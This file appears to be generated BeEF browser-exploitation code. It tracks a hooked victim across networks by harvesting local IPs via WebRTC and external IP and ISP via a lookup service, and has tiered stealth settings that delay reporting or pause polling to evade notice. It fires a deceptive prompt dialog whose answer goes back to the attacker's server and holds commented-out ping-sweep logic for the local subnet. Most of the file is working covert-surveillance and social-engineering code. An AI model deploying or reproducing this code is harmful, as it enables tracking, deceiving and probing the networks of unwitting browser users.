
                var prompt_dialog_d6b60c3234 = function(){
                    beef.execute(function() {
  
  var answer = prompt("You seem to have changed network?","")
  beef.net.send('/command/prompt_dialog.js', 1, 'answer='+answer);
});
                };
                var prompt_dialog_d6b60c3234_can_exec = false;
                var prompt_dialog_d6b60c3234_mod_output = null;
            

                
                var verbLogEnabled = true;
                var saveLocal = false;
                var onlineStatus = false;
                var rtcIps = "";
                var externalIp = "";
                var isp = "";
                var pollTimeout = 20000;
                var netcount = 0;
                var ts = null;
                // stealthLevel
                // 1 - not too stealthy, when we see a new network we will:
                //   - * immediately probe for external stuff
                //   - * immediately send data back to beef (or try)
                // 2 - sort of stealthy, when we see a new network we will:
                //   - * immediately probe for external stuff
                //   - * NOT send back to beef until we return to original network
                //   - * And the BeEF hook is disabled until we return
                // 3 - very stealthy, when we see a new network we will:
                //   - * NOT probe for external information
                //   - * NOT send back to beef until we return to original network
                //   - * And the BeeF hook is disabled until we return
                var stealthLevel = 1;

                // globals
                agTimer = null;
                agOnlineIntervalTimer = null;

                function verbLog(msg) {
                  if (verbLogEnabled === true) {
                    var p = document.createElement("p");
                    p.innerHTML = msg;
                    document.body.insertBefore(p, document.body.firstChild);
                    console.log(msg);
                  }
                }

                function printStatus(sendtobeef) {
                  var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;

                  verbLog("Online Status: '" + onlineStatus + "'");
                  verbLog("RTC IPs: '" + rtcIps+ "'");
                  verbLog("External IP: '" + externalIp + "'");
                  verbLog("ISP: '" + isp + "'");

                  if (sendtobeef == true) {
                    verbLog("FIX THIS")
                    //beef.net.send('<%= @command_url %>', <%= @command_id %>,
                    //              "OnlineStatus="+onlineStatus+"&RtcIps="+rtcIps+
                    //              "&ExternalIp="+externalIp+"&isp="+isp);
                  }
                }

                function getOnlineState() {
                  // https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine
                  return window.navigator.onLine;
                }

                // This is yanked from the WebRTC IP Module
                function getRtcIp(success, failure) {
                  var RTCPeerConnection = false;
                  if (window.webkitRTCPeerConnection) {
                    RTCPeerConnection = window.webkitRTCPeerConnection;
                  } else if (window.mozRTCPeerConnection) {
                    RTCPeerConnection = window.mozRTCPeerConnection;
                  }
              
                  if (RTCPeerConnection){
              
                      var addrs = Object.create(null);
                      addrs["0.0.0.0"] = false;
              
                      // Construct RTC peer connection
                      var servers = {iceServers:[]};
                      var mediaConstraints = {optional:[{googIPv6: true}]};
                      var rtc = new RTCPeerConnection(servers, mediaConstraints);
                      rtc.createDataChannel('', {reliable:false});
              
                      // Upon an ICE candidate being found
                      // Grep the SDP data for IP address data
                      rtc.onicecandidate = function (evt) {
                        if (evt.candidate){
                          grepSDP("a="+evt.candidate.candidate);
                        }
                      };
              
                      // Create an SDP offer
                      rtc.createOffer(function (offerDesc) {
                          grepSDP(offerDesc.sdp);
                          rtc.setLocalDescription(offerDesc);
                      }, function (e) {
                        // failed SDP offer - do nothing
                        failure("failed SDP offer");
                      });
              
                      // Return results
                      function processIPs(newAddr) {
                          // check here for only ipv4 // HACK
                          if (newAddr.length > 15) {
                              return;
                          }
                          if (newAddr in addrs) return;
                          else addrs[newAddr] = true;
                          var displayAddrs = Object.keys(addrs).filter(function (k) {
                              return addrs[k];
                          });
                          success(displayAddrs.join(","));
                      }
              
              
                      // Retrieve IP addresses from SDP 
                      function grepSDP(sdp) {
                          var hosts = [];
                          // c.f. http://tools.ietf.org/html/rfc4566#page-39
                          sdp.split('\r\n').forEach(function (line) {
                              // http://tools.ietf.org/html/rfc4566#section-5.13
                              if (~line.indexOf("a=candidate")) {
                                  // http://tools.ietf.org/html/rfc5245#section-15.1
                                  var parts = line.split(' '),
                                      addr = parts[4],
                                      type = parts[7];
                                  if (type === 'host') processIPs(addr);
                                         // http://tools.ietf.org/html/rfc4566#section-5.7
                              } else if (~line.indexOf("c=")) {
                                  var parts = line.split(' '),
                                      addr = parts[2];
                                  processIPs(addr);
                              }
                          });
                      }
                  }else {
                    failure("Doesnt support RTC");
                  }
              
                }
              
                // This function reaches out to <site> to get info
                // TODO: This should have 'failure' async method handling too
                function getExternalDetails(completion) {
                  var xhttp3 = new XMLHttpRequest();
                  xhttp3.onreadystatechange = function() {
                      if (xhttp3.readyState == 4 && xhttp3.status == 200) {
                          completion(xhttp3.responseText);
                      }
                  };
                  xhttp3.open("GET", "http://ip-api.com/json?rnd="+Date.now(), true);
                  xhttp3.send(); 
                }
              
                // This doesn't seem to work .. 
                // But it does work on FF?
                $j(document).on('online offline',function(e) {
                  verbLog("gone "+e.type);
                });
              
                // Check if we can use localStorage
                function storageAvailable(type) {
                  try {
                    var storage = window[type], x = '__storage_test__';
                      storage.setItem(x, x);
                      storage.removeItem(x);
                      return true;
                    }
                    catch(e) {
                      return false;
                    }
                }
              
                // Save state .. into localStorage if available
                // TODO: This should maybe save a json/data struct into some B64 encoded blob?
                function saveState(saveLocal, id, online, rtc, ip, isp) {
                  if (saveLocal == true) {
                    localStorage.setItem('rtc_'+id, rtc);
                    onlineStatus = online;
                    localStorage.setItem('ip_'+id, ip);
                    localStorage.setItem('isp_'+id, isp);
                    localStorage.setItem('ts_'+id, Date.now());
                  } // else ? what then?
                }
              
                // This tries to figure out where we are
                // In all instances, at the end, it should re-kick off the timers
                function presenceCheck() {
                  // how long have I been away for?
                  var prevStamp = ts;
                  verbLog("prev: " + Math.round(prevStamp/1000));
                  verbLog("Now: " + Math.round(Date.now()/1000));
              
                  if ((Math.round(prevStamp/1000)+60) < (Math.round(Date.now()/1000))) {
                    // it's been longer than a minute!
                    verbLog("It's been longer than a minute - what's happened?");
                  
                    startTimers();
                  } else {
                    // it's been less than a minute
                    verbLog("It's been less than a minute - what's happened?");
                    // do we want to double-check RTC? For instance, if we've gone from
                    // GSM to WiFi?
              
                    // check changes to online status
                    var freshOnlineStatus = getOnlineState();
                    if ((freshOnlineStatus.toString().toUpperCase()) === 
                            onlineStatus.toString().toUpperCase()) {
                      // we havent' changed status - apparently?
                      verbLog("we haven't changed online status");
              
                      startTimers();
                    } else {
                      // we are now in a different online state.
                      verbLog("we are now in a different state. freshOnlineStatus:");
                      verbLog("'" + freshOnlineStatus.toString() + "'");
              
                      if ((freshOnlineStatus.toString().toUpperCase()) === "FALSE") {
                        // we are now offline from being online
                        verbLog("we are now offline ... ");
                        onlineStatus = freshOnlineStatus;
              
                        startTimers();
                      } else {
                        // we are now online from offline
                        verbLog("we are back online!..");
                        verbLog("do checks here..");
              
                        getRtcIp(function(e) {
                          if (checkPreviousRtc(e)) {
                            // rtc hasn't changed
                            verbLog("rtc hasn't changed");
                            onlineStatus = freshOnlineStatus;
                
                            startTimers();
                          } else {
                            // check how different the IP is
                            verbLog("We were: " + localStorage.getItem('rtc_'+netcount));
                            verbLog("We are now: " + e);
                            onlineStatus = freshOnlineStatus;
                            // save a new network location object
                            // kick off scan
                            // store results
                            netRecon(e);
                            
                          }
              
                        }, function(e) {
                          //rut roh - couldn't get RtcIp?
                          verbLog("How?");
                        });
                      }
                    }
                  }
                }
              
                function checkPreviousRtc(ip) {
                  var result = false;
                  if (saveLocal === true) {
                    for (var c = 0; c <= netcount; c++) {
                      if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
                        result = true;
                      }
                    }
                  }
              
                  return result;
                }
                function checkOnlineState() {
                  var newState = getOnlineState();
                  if (onlineStatus !== newState) {
                    clearInterval(agOnlineIntervalTimer); // clear the interval 
                    clearTimeout(agTimer); // clear the timeout

                    verbLog("online status changed!");

                    presenceCheck();
                  }
                }

                function startTimers() {
                  ts = Date.now();
                  agTimer = setTimeout(function() {presenceCheck()}, pollTimeout);
                  clearInterval(agOnlineIntervalTimer);
                  agOnlineIntervalTimer = setInterval(function() {checkOnlineState()},
                                                         200);
                }

                function netRecon(rtcresult) {
                  verbLog("PERFORM NETWORK RECON HERE!");
                  getExternalDetails(function(e) {
                    externalIp = JSON.parse(e).query;
                    rtcIps = rtcresult;
                    isp = JSON.parse(e).isp;

                    netcount++;

                    if (stealthLevel === 1) {
                      printStatus(true);
                    } else {
                      printStatus(false);
                    }

                    saveState(saveLocal, netcount, onlineStatus, rtcresult, externalIp, isp);

                    //var s=rtcIps.split('.');
                    //var start = s[0]+'.'+s[1]+'.'+s[2]+'.65';
                    //var end = s[0]+'.'+s[1]+'.'+s[2]+'.70';
                    //var mod_input = start+'-'+end;

                    //ping_sweep(mod_input,4,get_http_servers);
                    outer_sequential_mod_output = rtcIps;
                    outer_sequential();


                    // startTimers();
                  });
                }

                function setupPhase() {
                  //redundant as we know?
                  if (storageAvailable('localStorage') == true) {
                    saveLocal = true;
                    // clear the current localStorage?
                    localStorage.clear();
                  }

                  onlineStatus = getOnlineState();

                  getRtcIp(function(e) {
                    rtcIps = e;
                    getExternalDetails(function(e) {
                      externalIp = JSON.parse(e).query;
                      isp = JSON.parse(e).isp;

                      printStatus(true);

                      saveState(saveLocal, netcount, onlineStatus, rtcIps, externalIp, isp);

                      if (stealthLevel > 1) {
                        // turn off beef polling
                        beef.updater.lock = true;
                      }
                      startTimers();

                      


                    });
                  }, function(e) {
                    //console.log("failure " + e);
                  });
                }

                function outer_sequential(){
                  verbLog("Starting outer sequential");
                  function prompt_dialog_d6b60c3234_f(){
                    verbLog("Running the inner function now");
                    //CODE
                    //var s=mod_input.split('.');
                    //var start = s[0]+'.'+s[1]+'.0.67';
                    //var end = s[0]+'.'+s[1]+'.0.71';
                    //var mod_input = start+'-'+end;
                    mod_input = "";
                    
                    verbLog("Running the mod with the following input: '" + mod_input);
                    prompt_dialog_d6b60c3234(mod_input);

                    if (stealthLevel > 1) {
                      // manually pop beef modules because we killed the timer
                      while(beef.commands.length > 0) {
                        verbLog("command POP");
                        command = beef.commands.pop();
                        try {
                          command();
                        } catch(e) {
                          beef.debug('dormant - failed to execute ' + e.message);
                          beef.debug(command.toString());
                        }
                      }
                    }
                  }


              

                    prompt_dialog_d6b60c3234_f();
                  }

                  verbLog("about to start..");

                  setupPhase();
              
